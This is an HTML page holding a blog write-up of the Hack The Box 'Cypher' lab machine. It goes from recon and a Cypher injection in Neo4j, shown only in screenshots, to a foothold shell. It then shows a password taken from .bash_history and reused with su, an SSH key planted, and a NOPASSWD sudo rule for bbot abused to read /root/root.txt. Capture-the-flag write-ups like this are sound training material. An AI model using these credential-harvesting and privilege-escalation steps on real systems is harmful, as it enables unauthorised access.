@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Cypher - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Cypher</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1747593469246"
+                  >2025-05-18 20:37</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1747691243599"
+                  >2025-05-19 23:47</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/b5827a79d1114d349dc185545fff0162.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A cypher.htb
+PORT   STATE SERVICE <span class="hljs-keyword">VERSION</span>
+22/tcp <span class="hljs-keyword">open</span>  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 be:68:<span class="hljs-keyword">db</span>:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
+|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:<span class="hljs-keyword">ac</span>:d6:3d:23 (ED25519)
+80/tcp <span class="hljs-keyword">open</span>  http    nginx 1.24.0 (Ubuntu)
+|_http-title: <span class="hljs-keyword">GRAPH</span> ASM
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $whatweb http://cypher.htb/
+http://cypher.htb/ <span class="hljs-comment">[200 OK]</span> Bootstrap, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[nginx/1.24.0 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.220.106]</span>, JQuery<span class="hljs-comment">[3.6.1]</span>, Script, Title<span class="hljs-comment">[GRAPH ASM]</span>, nginx<span class="hljs-comment">[1.24.0]</span></code></pre></div>
+<p><img src="/_resources/2cf08e75735f4649b280236f953cd65b.png" /></p>
+<p>Site doesnt have much to offer and <code>gobuster</code> doesnt find any subdomains. There is a login panel, but there is no account creation capability.</p>
+<p><img src="/_resources/51dc72bcd4204790937b72d7ac4efb3f.png" /></p>
+<p>Dirbuster finds <code>/testing</code> directory in which there is only one file, <code>custom-apoc-extension-1.0-SNAPSHOT.jar</code>.</p>
+<p><img src="/_resources/48f6bf17a28444bc9ee25eac74757b4b.png" /></p>
+<p>We can decompile it using <code>jd-gui</code>.</p>
+<p><img src="/_resources/93898343e02846668bde44e9dccf9a81.png" /></p>
+<p>Neo4j is a graph database — instead of storing data in rows and columns like SQL databases, it stores data as nodes, relationships, and properties. Neo4j uses a query language called Cypher, which explains the name of this box. It also has official support for GraphQL. Testing the login field, we can see that we can create an injection.</p>
+<p><img src="/_resources/e3e05b43e9c142ccb0c5d4212a02f1e5.png" /></p>
+<p>Testing it further and <a title="https://pentester.land/blog/cypher-injection-cheatsheet/" href="https://pentester.land/blog/cypher-injection-cheatsheet/">learning more about cypher</a> allowed me to call the custom java function discovered ealier. (<a title="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits" href="https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits">another good resource here</a>)</p>
+<p><img src="/_resources/01e83f8efd1242f09a51949d14ce778d.png" /></p>
+<p>That was the hard part. Now we can terminate the function earlier and basicly have an RCE.</p>
+<p><img src="/_resources/a6bcffd660f54efeb35ed16ec7e6bc7e.png" /></p>
+<p><img src="/_resources/f9e30e67d265480195b813fea44553db.png" /></p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<p>Lurking on the system we can find the pass in <code>.bash_history</code>.</p>
+<div><pre class="hljs"><code>neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:~/data/dbms</span><span class="hljs-variable">$ </span>cat ~/.bash_history
+neo4j-admin dbms set-initial-password cU4btyib.<span class="hljs-number">20</span>xtCMCXkBmerhK
+
+neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
+graphasm
+neo4j<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>su graphasm
+<span class="hljs-symbol">Password:</span> cU4btyib.<span class="hljs-number">20</span>xtCMCXkBmerhK
+
+graphasm<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>done <span class="hljs-symbol">:</span>)</code></pre></div>
+<p>We can add new public key to the <code>~/.ssh/authorized_keys</code> and go for root.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>There is only one interesting file in the home folder. What’s strange, is that there is no <code>bbot_scans</code> dir.</p>
+<div><pre class="hljs"><code>graphasm@cypher:~$ cat bbot_preset.yml 
+<span class="hljs-symbol">targets:</span>
+  - ecorp.htb
+<span class="hljs-symbol">
+output_dir:</span> <span class="hljs-keyword">/home/</span>graphasm/bbot_scans
+<span class="hljs-symbol">
+config:</span>
+<span class="hljs-symbol">  modules:</span>
+<span class="hljs-symbol">    neo4j:</span>
+<span class="hljs-symbol">      username:</span> neo4j
+<span class="hljs-symbol">      password:</span> cU4btyib<span class="hljs-number">.20</span>xtCMCXkBmerhK</code></pre></div>
+<p>Looking online for bbot we can find that it’s probably <a title="https://github.com/blacklanternsecurity/bbot" href="https://github.com/blacklanternsecurity/bbot">Bighuge BLS OSINT Tool</a>, which is clearly in the top 10 best tool names.</p>
+<p>What’s even cooler, is that we can run it with sudo.</p>
+<div><pre class="hljs"><code>graphasm<span class="hljs-variable">@cypher</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> graphasm on <span class="hljs-symbol">cypher:</span>
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>, use_pty
+
+User graphasm may run the following commands on <span class="hljs-symbol">cypher:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/local/bin/bbot</code></pre></div>
+<p>We can get root flag by running <code>sudo bbot --custom-yara-rules /root/root.txt -vv -d</code>. It is possible to gain root shell, by creating a custom module and running again bbot with sudo.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
